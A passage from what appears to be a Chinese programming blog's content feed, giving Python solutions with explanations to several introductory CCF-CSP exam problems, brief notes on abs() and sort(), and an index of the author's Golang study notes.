<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">m, n = map(int, input().split())  <span class="comment"># 获取输入的m，n</span></div><div class="line">lst = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(m):  <span class="comment"># 获取输入矩阵</span></div><div class="line">    lst.append(list(map(int, input().split())))</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):  <span class="comment"># 按列从右向左输出</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(m):  <span class="comment"># 从上到下输出每一列的元素</span></div><div class="line">        print(lst[j][i], end=<span class="string">' '</span>)</div><div class="line">    print()  <span class="comment"># 每输出一列就换行</span></div></pre></td></tr></table></figure>
<h5 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h5><p>　　上面的 <code>range(n - 1, -1, -1)</code> 函数来实现从右到左的逆序扫描，其实也可以换成下面的写法，<code>range(n)</code> 生成顺序列表，然后通过 <code>n-1-i</code> 来实现逆序扫描列，再从上到下输出每一列的元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">m, n = map(int, (input().split()))  <span class="comment"># 获取输入的m，n</span></div><div class="line">lst = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(m):  <span class="comment"># 获取输入矩阵</span></div><div class="line">    lst.append(list(map(int, input().split())))</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):  <span class="comment"># 按列从右向左输出，用 n-1-i 来控制</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(m):  <span class="comment"># 从上到下输出每一列的元素</span></div><div class="line">        print(lst[j][n - <span class="number">1</span> - i], end=<span class="string">" "</span>)  <span class="comment"># 输出元素</span></div><div class="line">    print()  <span class="comment"># 换行</span></div></pre></td></tr></table></figure>
<h4 id="201512-1-数位之和"><a href="#201512-1-数位之和" class="headerlink" title="201512-1 数位之和"></a>201512-1 数位之和</h4><h5 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201512-1</div><div class="line">试题名称：数位之和</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    给定一个十进制整数n，输出n的各位数字之和。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入一个整数n。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一个整数，表示答案。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    20151220</div><div class="line"></div><div class="line">样例输出</div><div class="line">    13</div><div class="line"></div><div class="line">样例说明</div><div class="line">    20151220的各位数字之和为2+0+1+5+1+2+2+0=13。</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    所有评测用例满足：0 ≤ n ≤ 1000000000。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　这个题非常之简单，只要注意如何读取输入即可。之前的所有例子都是通过 <code>input().split()</code> 来读取的，其中，<code>input()</code> 函数读取输入返回的是字符串，会把 <code>input()</code> 返回的字符串按照空格进行切分然后返回一个列表。而我们这里因为输入的就是一串数字，没有空格，所以不需要切分。于是，使用 <code>list(input())</code> 将输入的字符串转换成字符列表，然后通过 <code>map()</code> 函数将列表中的字符转换成整型，再使用 <code>sum()</code> 函数求和即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">lst = list(map(int, list(input())))</div><div class="line">print(sum(lst))</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang学习笔记博客汇总</title>
    <url>/2018/09/22/Golang%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E5%8D%9A%E5%AE%A2%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<center>Golang 学习系列笔记汇总。</center>

<a id="more"></a>
<p>　　回顾本科到研究生的这些年，一直在写程序，但是却没有真正系统地学过一门语言。其实，虽说编程语言都是只是工具，但是每一门语言都是博大精深的，都有其有魅力的地方。个人觉得应该系统的学习一两门语言，熟练掌握每一样工具的使用方法。于是，在师兄的建议下学习了 Golang 这门优美的语言，学习的过程中做了一些笔记与总结，整理如下：</p>
<ul>
<li><a href="http://fanzhenyu.me/2018/08/19/Golang%E7%AC%94%E8%AE%B0-%E7%AE%80%E4%BB%8B/" target="_blank" rel="external">Golang笔记-简介</a></li>
<li><a href="http://fanzhenyu.me/2018/08/19/Golang%E7%AC%94%E8%AE%B0-%E5%AE%89%E8%A3%85/" target="_blank" rel="external">Golang笔记-安装</a></li>
<li><a href="http://fanzhenyu.me/2018/08/20/Golang%E7%AC%94%E8%AE%B0-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/" target="_blank" rel="external">Golang笔记-开发工具</a></li>
<li><a href="http://fanzhenyu.me/2018/08/21/Golang%E7%AC%94%E8%AE%B0-%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/" target="_blank" rel="external">Golang笔记-基本结构</a></li>
<li><a href="http://fanzhenyu.me/2018/08/22/Golang%E7%AC%94%E8%AE%B0-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E8%BF%90%E7%AE%97%E7%AC%A6/" target="_blank" rel="external">Golang笔记-数据类型与运算符</a></li>
<li><a href="http://fanzhenyu.me/2018/08/22/Golang%E7%AC%94%E8%AE%B0-%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B8%B8%E9%87%8F/" target="_blank" rel="external">Golang笔记-变量与常量</a></li>
<li><a href="http://fanzhenyu.me/2018/08/22/Golang%E7%AC%94%E8%AE%B0-%E5%88%86%E6%94%AF%E7%BB%93%E6%9E%84/" target="_blank" rel="external">Golang笔记-分支结构</a></li>
<li><a href="http://fanzhenyu.me/2018/08/23/Golang%E7%AC%94%E8%AE%B0-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/" target="_blank" rel="external">Golang笔记-循环结构</a></li>
<li><a href="http://fanzhenyu.me/2018/08/23/Golang%E7%AC%94%E8%AE%B0-%E8%B7%B3%E8%BD%AC/" target="_blank" rel="external">Golang笔记-跳转</a></li>
<li><a href="http://fanzhenyu.me/2018/08/25/Golang%E7%AC%94%E8%AE%B0-%E5%87%BD%E6%95%B0/" target="_blank" rel="external">Golang笔记-函数</a></li>
<li><a href="http://fanzhenyu.me/2018/08/25/Golang%E7%AC%94%E8%AE%B0-%E6%95%B0%E7%BB%84/" target="_blank" rel="external">Golang笔记-数组</a></li>
<li><a href="http://fanzhenyu.me/2018/08/26/Golang%E7%AC%94%E8%AE%B0-%E5%88%87%E7%89%87/" target="_blank" rel="external">Golang笔记-切片</a></li>
<li><a href="http://fanzhenyu.me/2018/08/27/Golang%E7%AC%94%E8%AE%B0-Map/" target="_blank" rel="external">Golang笔记-Map</a></li>
<li><a href="http://fanzhenyu.me/2018/08/30/Golang%E7%AC%94%E8%AE%B0-%E7%BB%93%E6%9E%84%E4%BD%93/" target="_blank" rel="external">Golang笔记-结构体</a></li>
<li><a href="http://fanzhenyu.me/2018/09/02/Golang%E7%AC%94%E8%AE%B0-%E6%96%B9%E6%B3%95/" target="_blank" rel="external">Golang笔记-方法</a></li>
<li><a href="http://fanzhenyu.me/2018/09/02/Golang%E7%AC%94%E8%AE%B0-%E6%8E%A5%E5%8F%A3/" target="_blank" rel="external">Golang笔记-接口</a></li>
<li><a href="http://fanzhenyu.me/2018/09/13/Golang%E6%A0%87%E5%87%86%E5%BA%93%EF%BC%9Asort%E6%8E%92%E5%BA%8F/" target="_blank" rel="external">Golang标准库-sort排序</a></li>
<li>……(未完待续)</li>
</ul>
<p>参考资料：</p>
<ul>
<li><p><a href="https://github.com/Unknwon/the-way-to-go_ZH_CN" target="_blank" rel="external">《The Way to Go》中文译本</a></p>
</li>
<li><p><a href="https://book.douban.com/subject/27044219/" target="_blank" rel="external">Go程序设计语言</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 数列分段与折点计数</title>
    <url>/2018/09/21/CCF-CSP-%E6%95%B0%E5%88%97%E5%88%86%E6%AE%B5%E4%B8%8E%E6%8A%98%E7%82%B9%E8%AE%A1%E6%95%B0/</url>
    <content><![CDATA[<center>CCF-CSP 201509-1 数列分段 与 201604-1 折点计数 题解</center>

<a id="more"></a>
<h4 id="201509-1-数列分段"><a href="#201509-1-数列分段" class="headerlink" title="201509-1 数列分段"></a>201509-1 数列分段</h4><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201509-1</div><div class="line">试题名称：数列分段</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    给定一个整数数列，数列中连续相同的最长整数序列算成一段，问数列中共有多少段？</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含一个整数n，表示数列中整数的个数。</div><div class="line">    第二行包含n个整数a1, a2, …, an，表示给定的数列，相邻的整数之间用一个空格分隔。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一个整数，表示给定的数列有多个段。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    8</div><div class="line">    8 8 8 0 12 12 8 0</div><div class="line"></div><div class="line">样例输出</div><div class="line">    5</div><div class="line"></div><div class="line">样例说明</div><div class="line">    8 8 8是第一段，0是第二段，12 12是第三段，倒数第二个整数8是第四段，最后一个0是第五段。</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    1 ≤ n ≤ 1000，0 ≤ ai ≤ 1000。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><p>　　这个题目非常简单，初始化段的计数为1，因为至少有一个段，然后遍历数组，出现不同的数字意味着又有新的段，所以段的计数加1，否则就是同一个段，直接检查下一个数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 整数的个数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 给定的数列</span></div><div class="line">count = <span class="number">1</span>  <span class="comment"># 计数</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):</div><div class="line">    <span class="keyword">if</span> lst[i] != lst[i + <span class="number">1</span>]:  <span class="comment"># 每次不同就加1</span></div><div class="line">        count += <span class="number">1</span></div><div class="line"></div><div class="line">print(count)  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
<h4 id="201604-1-折点计数"><a href="#201604-1-折点计数" class="headerlink" title="201604-1 折点计数"></a>201604-1 折点计数</h4><h5 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201604-1</div><div class="line">试题名称：折点计数</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    给定n个整数表示一个商店连续n天的销售量。如果某天之前销售量在增长，而后一天销售量减少，则称这一天为折点，反过来如果之前销售量减少而后一天销售量增长，也称这一天为折点。其他的天都不是折点。如下图中，第3天和第6天是折点。</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/9/21-1.png" alt="21-1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">    给定n个整数a1, a2, …, an表示销售量，请计算出这些天总共有多少个折点。</div><div class="line">    为了减少歧义，我们给定的数据保证：在这n天中相邻两天的销售量总是不同的，即ai-1≠ai。注意，如果两天不相邻，销售量可能相同。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含一个整数n。</div><div class="line">    第二行包含n个整数，用空格分隔，分别表示a1, a2, …, an。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一个整数，表示折点出现的数量。</div><div class="line"></div><div class="line">样例输入</div><div class="line">   7</div><div class="line">   5 4 1 2 3 6 4</div><div class="line"></div><div class="line">样例输出</div><div class="line">   2</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    所有评测用例满足：1 ≤ n ≤ 1000，每天的销售量是不超过10000的非负整数。</div></pre></td></tr></table></figure>
<h5 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h5><p>　　这个题目也非常简单，由题目可知，这点的特点就是左右两个点要么都大于或者小于这个数，于是依据这个条件从第二个点开始，依次检查到倒数第二个点即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 整数个数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 整数列表</span></div><div class="line">count = <span class="number">0</span>  <span class="comment"># 计数变量</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, n - <span class="number">1</span>):  <span class="comment"># 遍历数组</span></div><div class="line">    <span class="keyword">if</span> (lst[i] &lt; lst[i - <span class="number">1</span>] <span class="keyword">and</span> lst[i] &lt; lst[i + <span class="number">1</span>]) <span class="keyword">or</span> (lst[i] &gt; lst[i - <span class="number">1</span>] <span class="keyword">and</span> lst[i] &gt; lst[i + <span class="number">1</span>]):  <span class="comment"># 计数</span></div><div class="line">        count += <span class="number">1</span></div><div class="line">print(count)  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 门禁系统</title>
    <url>/2018/09/21/CCF-CSP-%E9%97%A8%E7%A6%81%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<center>CCF-CSP 201412-1 门禁系统 题解</center>

<a id="more"></a>
<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201412-1</div><div class="line">试题名称：门禁系统</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    涛涛最近要负责图书馆的管理工作，需要记录下每天读者的到访情况。每位读者有一个编号，每条记录用读者的编号来表示。给出读者的来访记录，请问每一条记录中的读者是第几次出现。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含一个整数n，表示涛涛的记录条数。</div><div class="line">    第二行包含n个整数，依次表示涛涛的记录中每位读者的编号。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一行，包含n个整数，由空格分隔，依次表示每条记录中的读者编号是第几次出现。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    5</div><div class="line">    1 2 1 1 3</div><div class="line"></div><div class="line">样例输出</div><div class="line">    1 1 2 3 1</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    1≤n≤1,000，读者的编号为不超过n的正整数。</div></pre></td></tr></table></figure>
<h4 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h4><p>　　采用数组来记录，创建一个与输入规模同样大小的数组rst，初始化为0，从前面开始扫描，每个数与其自身及其后面的数比较，然后借助变量 <code>count</code> 来实现计数看这个数出现了多少次，分别记录到计数数组中去：</p>
<p>　　输入：<code>1 2 1 1 3</code> ，<code>rst</code> 数组初始化为 <code>0 0 0 0 0</code></p>
<p>　　首先，<code>lst[0]</code> 与自身和其后的数比较，即<code>1与1，1与2，1与1，1与1，1与3</code> 比较，若相等，则计数加1，记录到记录数组 <code>rst</code> 中，则第一次外层循环执行完后，<code>rst</code> 为：<code>1 0 2 3 0</code>，即1号读者的记录全部处理完成。</p>
<p>　　然后，<code>lst[1]</code> 与自身和其后的数比较，即<code>2与2，2与1，2与1，2与3</code> 比较，此次完成后，<code>rst</code> 为 <code>1 1 2 3 0</code></p>
<p>　　然后，<code>rst[2] 和 rst[3]</code> 都不为0 ， 即已经记录过，直接跳过<code>lst[2]</code> 和 <code>lst[3]</code>。</p>
<p>　　最后，<code>lst[4]</code> 与其自身比较，即 <code>3与3</code> 比较，<code>rst</code> 为 <code>1 1 2 3 1</code> ，将 <code>rst</code> 输出即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 记录条数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 记录中每位读者的编号</span></div><div class="line">rst = [<span class="number">0</span>] * n  <span class="comment"># 初始化计数数组</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">    <span class="keyword">if</span> rst[i] != <span class="number">0</span>:  <span class="comment"># 跳过已经记录的值</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line">    count = <span class="number">0</span>  <span class="comment"># 重置计数值</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i, n):  <span class="comment"># 从 i 开始比较</span></div><div class="line">        <span class="keyword">if</span> lst[i] == lst[j]:  <span class="comment"># 计数</span></div><div class="line">            count += <span class="number">1</span></div><div class="line">            rst[j] = count</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rst:  <span class="comment"># 输出结果</span></div><div class="line">    print(i, end=<span class="string">' '</span>)</div></pre></td></tr></table></figure>
<h4 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h4><p>　　上一种方法是每次处理一个读者的所有记录，而这一种方法则是通过记录的前后关系进行统计，将 <code>rst</code> 数组初始化为 1 ，每个数与其后的数进行比较，若相等则将记录数组的对应元素值加1，扫完整个数组就完成了。</p>
<p>　　输入：<code>1 2 1 1 3</code> ，<code>rst</code> 数组初始化为 <code>[1 1 1 1 1]</code></p>
<p>　　首先，<code>lst[0]</code> 与其后的数比较，即 <code>1与2，1与1，1与1，1与3</code> 比较，<code>rst</code> 为 <code>[1, 1, 2, 2, 1]</code></p>
<p>　　然后，<code>lst[1]</code> 与其后的数比较，即 <code>2与1，2与1，2与3</code> 比较，<code>rst</code> 为 <code>[1, 1, 2, 2, 1]</code></p>
<p>　　然后，<code>lst[2]</code> 与其后的数比较，即 <code>1与1，1与3</code> 比较，<code>rst</code> 为 <code>[1, 1, 2, 3, 1]</code></p>
<p>　　最后，<code>lst[3]</code> 与其后的数比较，即 <code>1与3</code> 比较，<code>rst</code> 为 <code>[1, 1, 2, 3, 1]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 记录条数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 记录中每位读者的编号</span></div><div class="line">rst = [<span class="number">1</span>] * n  <span class="comment"># 初始化计数数组为1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, n):  <span class="comment"># 从 i 后面的数开始比较</span></div><div class="line">        <span class="keyword">if</span> (lst[j] == lst[i]):  <span class="comment"># 计数</span></div><div class="line">            rst[j] += <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rst:  <span class="comment"># 输出结果</span></div><div class="line">    print(i, end=<span class="string">" "</span>)</div></pre></td></tr></table></figure>
<h4 id="题解3"><a href="#题解3" class="headerlink" title="题解3"></a>题解3</h4><p>　　还有一种比较巧妙的方法，用一个计数数组来记录每个读者的到访次数，这个数组的下标即为读者编号（因此，数组大小必须大于题目所给的1000），然后检查所有记录，每检查一条记录就将读者编号为下标的对应的数组元素值加1，并且直接输出，依次检查每一条记录即可。</p>
<p>　　输入：<code>1 2 1 1 3</code> </p>
<p>　　首先，对于<code>lst[0]</code>，即 <code>rec[1]</code> 的值加1，记录为1，直接输出，输出列表为 <code>1</code></p>
<p>　　然后，对于<code>lst[1]</code>，即 <code>rec[2]</code> 的值加1，记录为1，直接输出，输出列表为 <code>1 1</code></p>
<p>　　然后，对于<code>lst[2]</code>，即 <code>rec[1]</code> 的值加1，记录为2，直接输出，输出列表为 <code>1 1 2</code></p>
<p>　　然后，对于<code>lst[3]</code>，即 <code>rec[1]</code> 的值加1，记录为3，直接输出，输出列表为 <code>1 1 2 3</code></p>
<p>　　最后，对于<code>lst[4]</code>，即 <code>rec[3]</code> 的值加1，记录为1，直接输出，输出列表为 <code>1 1 2 3 1</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 记录条数</span></div><div class="line">lst = list(map(int, input().split()))  <span class="comment"># 记录中每位读者的编号</span></div><div class="line">rec = [<span class="number">0</span>] * <span class="number">1004</span>  <span class="comment"># 记录数组</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</div><div class="line">    rec[i] += <span class="number">1</span>  <span class="comment"># 计数</span></div><div class="line">    print(rec[i], end=<span class="string">' '</span>)  <span class="comment"># 每次计数后直接输出</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF-CSP 相邻数对</title>
    <url>/2018/09/21/CCF-CSP-%E7%9B%B8%E9%82%BB%E6%95%B0%E5%AF%B9/</url>
    <content><![CDATA[<center>CCF-CSP 201409-1 相邻数对 题解</center>

<a id="more"></a>
<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201409-1</div><div class="line">试题名称：相邻数对</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">    给定n个不同的整数，问这些数中有多少对整数，它们的值正好相差1。</div><div class="line"></div><div class="line">输入格式</div><div class="line">    输入的第一行包含一个整数n，表示给定整数的个数。</div><div class="line">    第二行包含所给定的n个整数。</div><div class="line"></div><div class="line">输出格式</div><div class="line">    输出一个整数，表示值正好相差1的数对的个数。</div><div class="line"></div><div class="line">样例输入</div><div class="line">    6</div><div class="line">    10 2 6 3 7 8</div><div class="line"></div><div class="line">样例输出</div><div class="line">    3</div><div class="line"></div><div class="line">样例说明</div><div class="line">    值正好相差1的数对包括(2, 3), (6, 7), (7, 8)。</div><div class="line"></div><div class="line">评测用例规模与约定</div><div class="line">    1&lt;=n&lt;=1000，给定的整数为不超过10000的非负整数。</div></pre></td></tr></table></figure>
<h4 id="题解1"><a href="#题解1" class="headerlink" title="题解1"></a>题解1</h4><p>　　从第一个数开始，依次向后扫描，每次将该数与其之后的数进行比较，检查差值是不是 1，如果是则是相邻数，否则不是。样例演示如下：</p>
<p>　　10与2，10与6，10与3，10与7，10与8比较</p>
<p>　　2与6，2与3，2与7，2与8比较</p>
<p>　　……以此类推</p>
<p>　　Python 代码实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())  <span class="comment"># 获取整数个数的输入</span></div><div class="line">a = list(map(int, input().split()))  <span class="comment"># 获取输入的n个整数</span></div><div class="line">count = <span class="number">0</span>  <span class="comment"># 计数</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):  <span class="comment"># 按顺序扫描</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(i + <span class="number">1</span>, n):</div><div class="line">        <span class="keyword">if</span> abs(a[j] - a[i]) == <span class="number">1</span>:  <span class="comment"># 判断是否是相邻数</span></div><div class="line">            count += <span class="number">1</span></div><div class="line">print(count)  <span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
<h4 id="题解2"><a href="#题解2" class="headerlink" title="题解2"></a>题解2</h4><p>　　与题解 1 不同的是，我们可以使用 <code>sort()</code> 函数对输入的数据先进行排序，然后再扫描列表，判断其与后面一个数的差值是否为 1，如果是则是相邻数，否则不是。样例演示如下：</p>
<p>　　排序后：2，3，6，7，8，10</p>
<p>　　2与3，3与6，6与7，7与8，8与10比较即可。</p>
<p>　　Python 代码实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">n = int(input())	<span class="comment"># 获取整数个数的输入</span></div><div class="line">a = list(map(int, input().split()))	<span class="comment"># 获取输入的n个整数</span></div><div class="line">a.sort()	<span class="comment"># 排序</span></div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-1</span>):	<span class="comment"># 按顺序扫描</span></div><div class="line">    <span class="keyword">if</span> a[i]+<span class="number">1</span> == a[i+<span class="number">1</span>]:	<span class="comment"># 判断是否是相邻数</span></div><div class="line">        count += <span class="number">1</span></div><div class="line">print(count)	<span class="comment"># 输出结果</span></div></pre></td></tr></table></figure>
<h4 id="知识点补充"><a href="#知识点补充" class="headerlink" title="知识点补充"></a>知识点补充</h4><h5 id="abs-函数"><a href="#abs-函数" class="headerlink" title="abs() 函数"></a>abs() 函数</h5><p>　　<code>abs()</code> 函数返回数字的绝对值。参数可以是实数(整数、浮点数等）或复数，如果参数是复数，则返回复数的模。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>abs(<span class="number">-1</span>)</div><div class="line"><span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>abs(<span class="number">-11.1</span>)</div><div class="line"><span class="number">11.1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>abs(<span class="number">4</span>+<span class="number">3j</span>)</div><div class="line"><span class="number">5.0</span></div></pre></td></tr></table></figure>
<h5 id="sort-函数"><a href="#sort-函数" class="headerlink" title="sort() 函数"></a>sort() 函数</h5><p>　　<code>sort()</code> 函数用于对原列表进行排序，如果指定参数，则使用比较函数指定的比较函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">list.sort(cmp=<span class="keyword">None</span>, key=<span class="keyword">None</span>, reverse=<span class="keyword">False</span>)</div></pre></td></tr></table></figure>
<p>　　参数说明：</p>
<ul>
<li>key指定一个参数的函数，该函数用于从每个列表元素中提取比较键（例如，key=str.lower）。对应于列表中每个项的键计算一次，然后用于整个分类过程。默认值None 表示列表项直接排序而不计算单独的键值。</li>
<li>reverse 排序规则，reverse = True 降序， reverse = False 升序（默认）。</li>
</ul>
<p>　　参数 <code>reverse</code> 的使用，升序与降序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L.sort() <span class="comment"># 升序</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(L)</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L.sort(reverse=<span class="keyword">True</span>) <span class="comment"># 降序</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(L)</div><div class="line">[<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</div></pre></td></tr></table></figure>
<p>　　参数 <code>key</code> 的使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>L = [<span class="string">'a'</span>,<span class="string">'Z'</span>,<span class="string">'w'</span>,<span class="string">'C'</span>,<span class="string">'A'</span>,<span class="string">'b'</span>,<span class="string">'t'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>L.sort(key=str.lower)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(L)</div><div class="line">[<span class="string">'a'</span>, <span class="string">'A'</span>, <span class="string">'b'</span>, <span class="string">'C'</span>, <span class="string">'t'</span>, <span class="string">'w'</span>, <span class="string">'Z'</span>]</div></pre></td></tr></table></figure>
<p>　　通过指定列表中的元素排序来输出列表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">takeSecond</span><span class="params">(elem)</span>:</span> <span class="comment"># 取第2个元素</span></div><div class="line">    <span class="keyword">return</span> elem[<span class="number">1</span>]</div><div class="line"></div><div class="line">L = [(<span class="number">2</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">3</span>)]</div><div class="line">L.sort(key=takeSecond)</div><div class="line">print(L)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[(4, 1), (2, 2), (1, 3), (3, 4)]</div></pre></td></tr></table></figure>
<p>　　使用 <code>lambda</code> ，按 <code>value</code> 排序：</p>
